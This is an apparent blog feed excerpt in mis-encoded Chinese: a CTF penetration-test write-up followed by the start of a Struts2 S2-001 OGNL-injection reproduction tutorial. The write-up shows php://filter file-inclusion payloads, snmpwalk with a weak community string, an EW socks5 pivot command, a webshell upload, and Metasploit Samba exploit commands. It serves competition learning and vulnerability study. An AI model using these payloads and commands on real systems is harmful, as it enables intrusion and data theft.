<p>å…ˆä»50è¿™å°ä¸‹æ‰‹ï¼Œnmapæ‰«æå¾—åˆ°å‡ ä¸ªç«¯å£ï¼š80,137,3389ç­‰<br>è¿™é‡ŒåŸºæœ¬å¯ä»¥çŸ¥é“æ˜¯å°windowsæœåŠ¡å™¨äº†ï¼ˆå¯èƒ½æœ‰msç³»åˆ—æ¼æ´æˆ–è€…å¯ä»¥3389çˆ†ç ´ä¸€æ³¢ï¼‰ï¼Œ<br>æ‰“å¼€æµè§ˆå™¨ç›´æ¥è®¿é—®å‘ç°æ˜¯ä¸ªphpé¡µé¢ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæºä»£ç æç¤ºåŒ…å«Tips.phpï¼Œç›´æ¥ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?file=php://filter/read=convert.base64-encode/resource=Tips.php</div><div class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>è¯»ä¸€ä¸‹æºç ï¼Œå¾—åˆ°æç¤ºï¼š<code>Have you ever heard of SNMP information trasures??</code><br>å…ˆä¸ç®¡æç¤ºï¼Œfuzzè¯»å–äº†ä¸€ä¸‹<code>flag.php</code>ï¼Œç›´æ¥è¯»å–åˆ°flag5ï¼Œæ‹¿ä¸‹100åˆ†ï¼Œè¿™é‡Œå¼€äº†ä¸ªè„‘æ´ï¼Œcç›˜æ ¹ç›®å½•ä¼šä¸ä¼šä¹Ÿæœ‰ä¸ªflagå‘¢ï¼Ÿ<br>äºæ˜¯å°è¯•è¯»å–<code>c:\\flag.txt</code>ï¼Œæœç„¶ï¼Œè¯»åˆ°äº†flag4ï¼Œåˆæ‹¿ä¸‹100åˆ†ã€‚ï¼ˆè¿™é‡Œå·¥ä½œäººå‘˜è¿‡æ¥é—®æˆ‘æ˜¯ä¸æ˜¯æ‹¿åˆ°äº†æœåŠ¡å™¨æƒé™ï¼Œæ€ä¹ˆè¿™ä¹ˆå¿«ï¼Œåªèƒ½å‘Šè¯‰ä»–æˆ‘æ˜¯é æ„è¯†çŒœçš„flagï¼‰  </p>
<h2 id="0x01-æ‹¿ä¸‹æœåŠ¡å™¨"><a href="#0x01-æ‹¿ä¸‹æœåŠ¡å™¨" class="headerlink" title="0x01 æ‹¿ä¸‹æœåŠ¡å™¨"></a>0x01 æ‹¿ä¸‹æœåŠ¡å™¨</h2><p>å†å›åˆ°æç¤ºï¼Œé€šè¿‡æœç´¢å¼•æ“ï¼Œæ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š<a href="http://www.freebuf.com/column/144144.html" target="_blank" rel="noopener">ä¸€æ¬¡å¯¹SNMPæœåŠ¡çš„æ¸—é€æµ‹è¯•</a><br>æ–‡ä¸­ç»™å‡ºäº†å¤šç§æ–¹æ³•å¯¹SNMPæœåŠ¡è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨äº†<code>metasploit</code>çš„<code>auxiliary/scanner/snmp/snmp_login</code>ï¼Œè®¾ç½®ä¸€ä¸‹å‚æ•°ç„¶åè¿è¡Œï¼Œè·‘å‡ºSNMPå­˜åœ¨å¼±å¯†ç ï¼Œå¯ä»¥ç›´æ¥è¯»å–ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ä¸€æ³¢<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">snmpwalk -v1 -c admin <span class="number">202</span>.<span class="number">1</span>.<span class="number">2</span>.<span class="number">50</span></div></pre></td></tr></table></figure></p>
<p>ç„¶åè¿”å›äº†ä¸€å¤§å †ç³»ç»Ÿæ•æ„Ÿï¼Œæœ‰ç”¨æˆ·åˆ—è¡¨ï¼Œipä¿¡æ¯ç­‰ç­‰ï¼Œåœ¨ç”¨æˆ·åˆ—è¡¨é‚£é‡Œå‘ç°äº†ä¸€ä¸ªåä¸º<code>libai</code>çš„ç”¨æˆ·ï¼Œéšæ‰‹<code>mstsc</code>è¿æ¥3389æµ‹è¯•ä¸€ä¸‹å¼±å£ä»¤ï¼Œæœä¸å…¶ç„¶ï¼Œ<code>libai</code>ç”¨æˆ·çš„å¯†ç ä¸º<code>admin</code>ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿˜æœ‰ç®¡ç†å‘˜æƒé™ï¼Œè¿™é‡Œå°±ç®—æ˜¯å½»åº•æ‹¿ä¸‹50è¿™å°æœåŠ¡å™¨äº†<br>åœ¨æœåŠ¡å™¨é‡Œæ¢ç´¢ä¸€æ³¢ï¼Œå‘ç°httpæœåŠ¡æ˜¯ç”¨<code>phpstudy</code>æ­å»ºçš„ï¼Œç”¨phpstudyè¿æ¥è¿›mysqlæ•°æ®åº“ï¼Œåœ¨testæ•°æ®åº“é‡Œæ‰¾åˆ°flag6<br>ç„¶åå…¨å±€æœç´¢æ–‡ä»¶ï¼Œæœç´¢åˆ°ä¸¤ä¸ªåå­—å¸¦æœ‰flagçš„å›¾ç‰‡æ–‡ä»¶ï¼Œè®©é˜Ÿå‹å»åšäº†ï¼Œä¸è¿‡ä¹Ÿæ²¡åšå‡ºå•¥  </p>
<h2 id="0x02-å†…ç½‘æ¸—é€"><a href="#0x02-å†…ç½‘æ¸—é€" class="headerlink" title="0x02 å†…ç½‘æ¸—é€"></a>0x02 å†…ç½‘æ¸—é€</h2><p>æœåŠ¡å™¨ç¿»å¾—å·®ä¸å¤šäº†ï¼Œå†…ç½‘æ¢æµ‹ä¸€æ³¢ï¼Œå‘ç°å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">192.168.1.2 å¼€å¯80ï¼Œ53ç«¯å£</div><div class="line">192.168.1.43 8080ç«¯å£å­˜åœ¨ä¸€ä¸ªdotcms</div></pre></td></tr></table></figure></p>
<p>.2è¿™å°æ„Ÿè§‰æ˜¯å°dnsæœåŠ¡å™¨ï¼Œä¸è¿‡æ²¡æœ‰ä»€ä¹ˆæ€è·¯ï¼Œå…ˆä»dotå¼€å§‹å§ï¼Œè¿™é‡Œå› ä¸ºdotåœ¨50çš„å†…ç½‘ï¼Œæ‹·å·¥å…·è¿›å»æ¸—é€å¾ˆä¸æ–¹ä¾¿ï¼Œåœ¨50ä¸Šç”¨ewè·‘äº†ä¸ªsocks5ä»£ç†ï¼ŒæŠŠ50å½“ä½œè·³æ¿<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ew_for_Win.exe -s ssocksd -l <span class="number">1080</span></div></pre></td></tr></table></figure></p>
<p>ç„¶åæœ¬åœ°é…ä¸ªä»£ç†å°±èƒ½ç›´æ¥è®¿é—®äº†ï¼Œæœç´¢å¼•æ“æŸ¥åˆ°è¯¥ç‰ˆæœ¬çš„dotcmså­˜åœ¨ä¸€ä¸ªsqlæ³¨å…¥å’Œä¸€ä¸ªåå°getshellæ¼æ´ï¼Œä½†æ˜¯æ³¨å…¥è¿˜æ˜¯ç›²æ³¨ï¼Œå¥½éº»çƒ¦<br>åå°æµ‹äº†ä¸€æ³¢å¼±å£ä»¤ï¼Œæœªæœï¼Œçªç„¶å‘ç°åœ¨æ™®é€šç”¨æˆ·ç™»å½•ç•Œé¢æœ‰ä¸ªé‚®ç®±å’Œå¯†ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bill@xxxxx.com (å…·ä½“çš„æˆ‘å¿˜äº†ï¼)</div><div class="line">bill</div></pre></td></tr></table></figure></p>
<p>çŒœæµ‹å®ƒä¹Ÿæ˜¯åå°ç®¡ç†å‘˜å¸å·ï¼Œç›´æ¥ç™»é™†ï¼Œæœç„¶æˆåŠŸäº†ï¼Œç„¶åç”¨åå°getshellæ¼æ´æ¥getshell<br>å‚è€ƒåœ°å€:<a href="http://seclists.org/fulldisclosure/2017/Jul/33" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/2017/Jul/33</a><br>å‚è€ƒæ–‡ç« ï¼Œæ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œè¿™é‡Œæˆ‘ç”¨firefoxçš„ä¿®æ”¹æ•°æ®åŒ…åŠŸèƒ½æ„é€ äº†<code>ä»»æ„æ–‡ä»¶ä¸Šä¼ </code>çš„åŒ…ï¼Œä¼ äº†ä¸ªjspç½‘é©¬ï¼Œè¿™é‡Œå› ä¸ºåå°æœ‰wafçš„åŸå› ï¼Œè¿˜æ˜¯ä¸Šäº†ä¸ªå…æ€é©¬æ‰æˆåŠŸçš„ï¼Œæ€»ä¹‹æ‹¿åˆ°äº†shell<br><img src="/img/2018-t3sec-1.png" alt=""><br>å› ä¸ºæ˜¯<code>jspç½‘ç«™</code>çš„åŸå› ï¼Œç›´æ¥å°±æ˜¯<code>administrator</code>æƒé™äº†ï¼Œåœ¨cç›˜å‘ç°äº†flag2ï¼Œå½“æ—¶æ—¶é—´æœ‰é™è€Œä¸”è¿™å°æœåŠ¡å™¨æ²¡æœ‰å¼€å¯3389ï¼Œæ²¡æœ‰ç»§ç»­æ·±å…¥æŒ–æ˜ï¼Œåæ¥å¬è¯´dotçš„å‰ç«¯é¡µé¢ä¹Ÿæœ‰ä¸ªflagï¼Œç„¶åè¿˜æœ‰ä¸ªflagåœ¨å›æ”¶ç«™é‡Œï¼Œè„‘æ´æœç„¶å¤Ÿå¤§ï¼Œé™„ä¸ŠcmdæŸ¥çœ‹å›æ”¶ç«™å‘½ä»¤ï¼š<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> $recycle.bin</div></pre></td></tr></table></figure></p>
<h2 id="0x03-FTPæœåŠ¡å™¨"><a href="#0x03-FTPæœåŠ¡å™¨" class="headerlink" title="0x03 FTPæœåŠ¡å™¨"></a>0x03 FTPæœåŠ¡å™¨</h2><p>æ¥ç€å¯¹60æœåŠ¡å™¨è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œnmapæ‰«æï¼Œå‘ç°å¼€å¯äº†21ï¼Œ22ï¼Œ445ï¼Œæœ‰ä¸ªftpæœåŠ¡ï¼Œå½“æ—¶æŸ¥äº†ä¸€ä¸‹ftpç‰ˆæœ¬ï¼Œæ²¡å•¥æ¼æ´ï¼Œç„¶åç”¨<code>hydra</code>çˆ†ç ´ä¸€æ³¢ï¼Œä¹Ÿæ²¡çˆ†å‡ºæ¥ä¸œè¥¿ï¼Œèµ›åå¾—çŸ¥æ˜¯linuxçš„æ°¸æ’ä¹‹è“æ¼æ´ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œå‚è€ƒï¼š<a href="https://bbs.ichunqiu.com/thread-23281-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-23281-1-1.html</a><br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use exploit/linux/samba/is_known_pipename</div><div class="line"><span class="built_in">set</span> RHOST <span class="number">202</span>.<span class="number">1</span>.<span class="number">2</span>.<span class="number">60</span></div><div class="line">run</div></pre></td></tr></table></figure></p>
<h2 id="0x04-æ•°æ®èµ›"><a href="#0x04-æ•°æ®èµ›" class="headerlink" title="0x04 æ•°æ®èµ›"></a>0x04 æ•°æ®èµ›</h2><p>å…ˆè´´ä¸€ä¸‹æœ€ç»ˆç­”æ¡ˆæˆªå›¾ï¼ˆé˜Ÿå‹ä½™è€å¸ˆæˆªçš„å›¾ï¼‰<br><img src="/img/2018-t3sec-2.png" alt=""><br><img src="/img/2018-t3sec-3.png" alt=""><br>å…¶ä¸­å¤§éƒ¨åˆ†é¢˜ç›®åªè¦å¯¹æ¸—é€æµ‹è¯•æœ‰ä¸€å®šçš„äº†è§£ï¼Œä¼šä½¿ç”¨wiresharkä¹‹ç±»çš„æµé‡åˆ†æå·¥å…·ï¼Œéƒ½èƒ½è§£å‡ºï¼Œæˆ‘å°±ä¸è¯¦ç»†è¯´äº†ï¼Œ<br>è®²ä¸€ä¸‹å¡äº†ç‰¹åˆ«ä¹…çš„ä¸¤é“é¢˜ï¼ˆä¸­é—´å·®ç‚¹è·³è¿‡é‚£ç§ï¼Œè¿˜å¥½æ²¡è·³è¿‡ï¼Œæœ€åå…¨éƒ¨åšå‡ºåŠ äº†100å¤šåˆ†ï¼‰ï¼Œä¸€ä¸ªæ˜¯ç¬¬9é¢˜ï¼Œå›¾ç‰‡æœ¨é©¬çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œå…¶å®åªè¦æ‰¾åˆ°å¯¹åº”çš„ä½ç½®ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åcatä¸€ä¸‹å°±èƒ½å‘ç°phpä¸€å¥è¯äº†ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆå¡äº†é‚£ä¹ˆä¹…ï¼‰<br>è¿˜æœ‰ä¸€ä¸ªæ˜¯ç¬¬12é¢˜ï¼Œæ‰¾é»‘å®¢å¾€FTPä¸Šä¼ çš„æ–‡ä»¶åï¼Œå› ä¸ºæŒ‚äº†ä¸ªreGeorgä»£ç†ï¼Œftpåè®®å˜å¾—å¾ˆå¥‡æ€ªï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ‰¾äº†å¥½ä¹…ï¼Œä»¥ä¸ºåé¢è¿˜æœ‰å¾ˆå¤šé¢˜ï¼Œæƒ³å½“ç„¶åœ°ä»¥ä¸ºè¿™é¢˜ä¸€å®šåœ¨ç¬¬8ä¸ªæ•°æ®åŒ…é‡Œï¼Œç»“æœåªæ‰¾åˆ°äº†FTPå¯†ç ï¼Œç„¶åæƒ³äº†æƒ³å»çœ‹çœ‹ç¬¬9ä¸ªåŒ…å§ï¼Œè¿›å»æœç´¢ä¸€ä¸‹FTPåè®®ä¸Šä¼ æ–‡ä»¶çš„å‘½ä»¤<code>STOR</code>ï¼Œç›´æ¥å°±æ‰¾åˆ°äº†</p>
<h2 id="0x05-ä¸ªäººèµ›"><a href="#0x05-ä¸ªäººèµ›" class="headerlink" title="0x05 ä¸ªäººèµ›"></a>0x05 ä¸ªäººèµ›</h2><p>é˜Ÿå‹jakenæ‹¿äº†ä¸ªä¸€è¡€ï¼Œwebç‹—è¡¨ç¤ºè†œæ‹œ</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»Šå¹´åˆ†åŒºèµ›å› ä¸ºå’ŒDefcon Chinaæ’è½¦çš„åŸå› ï¼Œå‡ ä¸ªå¼ºé˜Ÿå¥½åƒéƒ½ä¸æ˜¯ä¸»åŠ›æ¥æ‰“ï¼Œæ²¡æœ‰è¢«åŠæ‰“çš„å¾ˆä¸¥é‡ï¼Œä¸è¿‡è¿˜æ˜¯çœ‹åˆ°äº†è‡ªå·±çš„å¾ˆå¤šä¸è¶³ï¼Œå†…ç½‘æ¸—é€åšåšçš„è¿˜ä¸æ˜¯ç‰¹åˆ«å¥½ï¼Œå¯¹å¾ˆå¤šæ¼æ´æ²¡æœ‰æ•æ„Ÿçš„å—…è§‰ï¼Œå¯¹å‡ ä¸ªå·¥å…·çš„ä½¿ç”¨ä¹Ÿä¸æ˜¯ç‰¹åˆ«ç†Ÿç»ƒï¼Œæ•°æ®åˆ†æå¡é¢˜ä¸¥é‡<br>ä¸è¿‡ç»“æœè¿˜æ˜¯å¥½çš„ï¼Œæ‹¿äº†ä¸ªäºšå†›ï¼ŒæˆåŠŸæ™‹çº§å†³èµ›ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šæ‰“ï½ï¼Œé™„ä¸Šæœ€åæ’è¡Œå›¾<br><img src="/img/2018-t3sec-4.png" alt=""><br>ï¼ˆæœ€åå¼±å¼±åœ°åæ§½ä¸€ä¸‹ï¼Œä»Šå¹´äºšå†›çš„å¥–é‡‘æ¯”å»å¹´1/3åœºåˆ†åŒºèµ›çš„å­£å†›å¥–é‡‘è¿˜å°‘ï¼ï¼‰</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æ—¶éš”ä¸€å¹´å†æ¬¡å‚åŠ é“ä¸‰ï¼Œä»Šå¹´çš„èµ›åˆ¶æœ‰ç‚¹æ”¹åŠ¨ï¼Œä¼ä¸šèµ›ä¸ªäººèµ›å’Œæ•°æ®èµ›ä¸‰åœºåœ¨åŒä¸€å¤©è¿›è¡Œï¼Œåœ¨é˜Ÿå‹ä»¬çš„å¸¦é¢†ä¸‹æ··äº†ä¸ªèµ›åŒºç¬¬äºŒåï¼ŒæˆåŠŸæ™‹çº§å†³èµ›ã€‚æœ¬æ¬¡æ¯”èµ›ä¸­æˆ‘ä¸»è¦è´Ÿè´£çš„æ˜¯ä¼ä¸šèµ›éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯å¯¹ç»™å®šç›®æ ‡è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç„¶åä¸­é—´ç©¿æ’ç€åšäº†å‡ é“æ•°æ®èµ›çš„é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚ï¼ˆå› ä¸ºæ¯”èµ›è¿‡ç¨‹ä¸­æ²¡æ€ä¹ˆæˆªå›¾ï¼Œå¸ˆå‚…ä»¬åˆ«æ‰“æˆ‘ï¼‰&lt;/p&gt;
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="æµé‡åˆ†æ" scheme="https://www.codemonster.cn/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Struts2Vulsä¹‹S2-001æ¼æ´å¤ç°ä¸ç®€è¦åˆ†æ</title>
    <link href="https://www.codemonster.cn/2018/03/28/2018-struts2-001/"/>
    <id>https://www.codemonster.cn/2018/03/28/2018-struts2-001/</id>
    <published>2018-03-28T14:34:58.000Z</published>
    <updated>2018-07-28T06:19:53.020Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ç»å†äº†å‡ æ¬¡é¢è¯•ï¼Œæ·±è§‰åœ¨ä¼ä¸šä¸­ï¼Œjavaå®‰å…¨æ˜¯ååˆ†å—é‡è§†çš„ï¼Œäºæ˜¯æ‰“ç®—å¯¹javaå®‰å…¨è¿›è¡Œæ·±å…¥å­¦ä¹ ï¼Œæœ¬ç³»åˆ—æ˜¯å¯¹Struts2çš„æ¼æ´è¿›è¡Œåˆ†æä¸å¤ç°ï¼Œå†™çš„ä¸å¥½æ¬¢è¿å¤§å®¶æŒ‡å‡ºé—®é¢˜ï¼Œæœ¬æ–‡æ‰€æœ‰æºç ä¸poc&amp;expï¼š<a href="https://github.com/xishir/Struts2Vuls/tree/master/S2-001" target="_blank" rel="noopener">https://github.com/xishir/Struts2Vuls/tree/master/S2-001</a><br><a id="more"></a></p>
<h1 id="æ¼æ´æ‘˜è¦"><a href="#æ¼æ´æ‘˜è¦" class="headerlink" title="æ¼æ´æ‘˜è¦"></a>æ¼æ´æ‘˜è¦</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">å®˜æ–¹é“¾æ¥ï¼šhttps://cwiki.apache.org/confluence/display/WW/S2-001</div><div class="line">å®˜æ–¹æ¦‚è¿°ï¼šRemote code exploit on form validation error</div><div class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.8</div><div class="line">ä¿®å¤æ‘˜è¦ï¼šæ•°æ® re-display æ—¶ç¦æ­¢æ‰§è¡Œ OGNL è¡¨è¾¾å¼</div></pre></td></tr></table></figure>
<h1 id="ç®€è¦åŸç†"><a href="#ç®€è¦åŸç†" class="headerlink" title="ç®€è¦åŸç†"></a>ç®€è¦åŸç†</h1><p>åœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚æœç”¨æˆ·æ‰€æäº¤çš„è¡¨å•å‡ºç°<code>éªŒè¯é”™è¯¯</code>ï¼Œåç«¯ä¼šå¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œ<code>è§£æå¤„ç†</code>ï¼Œç„¶åè¿”å›å¹¶<code>æ˜¾ç¤ºå¤„ç†ç»“æœ</code>ã€‚  ä¸¾ä¸ªä¾‹å­ï¼Œå½“ä½ æäº¤çš„ç™»å½•è¡¨å•ä¸º<code>username=xishir&amp;password=%{1+1}</code>æ—¶ï¼Œåç«¯éªŒè¯ç™»å½•å¤±è´¥åä¼šè¿”å›ç™»å½•ç•Œé¢å¹¶æ˜¾ç¤ºä½ çš„è¾“å…¥ï¼Œè¿™æ—¶passwordå­—æ®µä¸­çš„OGNLè¡¨è¾¾å¼å·²ç»è¢«è§£æå¤„ç†è¿‡äº†ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤º<code>%{1+1}</code>çš„è§£æç»“æœ<code>2</code>ï¼Œä»è€Œå¯ä»¥æ„é€ payloadè¿›è¡ŒRCEã€‚</p>
<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><h3 id="ä¸‹è½½struts-2-0-1"><a href="#ä¸‹è½½struts-2-0-1" class="headerlink" title="ä¸‹è½½struts-2.0.1"></a>ä¸‹è½½struts-2.0.1</h3><p>åœ°å€ï¼š<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip</a></p>
<h3 id="åˆ›å»ºwebå·¥ç¨‹"><a href="#åˆ›å»ºwebå·¥ç¨‹" class="headerlink" title="åˆ›å»ºwebå·¥ç¨‹"></a>åˆ›å»ºwebå·¥ç¨‹</h3><p>ç›®å½•ç»“æ„<br><img src="/img/s2/s2-001-1.png" alt=""><br>è¿™é‡Œæˆ‘æ˜¯ç”¨çš„æ˜¯MyEclipseï¼Œåˆ›å»ºä¸€ä¸ªwebå·¥ç¨‹ï¼Œç„¶åå°†struts-2.0.1ä¸­çš„å‡ ä¸ªjaråŒ…å¯¼å…¥å¹¶æ–°å»ºå¦‚ä¸‹å‡ ä¸ªæ–‡ä»¶<br>web.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>S2-001 Example<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>index.jsp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></div><div class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>S2-001 Demo<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>link: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;</span>https://cwiki.apache.org/confluence/display/WW/S2-001<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">action</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">label</span>=<span class="string">"username"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">label</span>=<span class="string">"password"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">s:submit</span>&gt;</span><span class="tag">&lt;/<span class="name">s:submit</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>welcome.jsp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></div><div class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></div><div class="line"><span 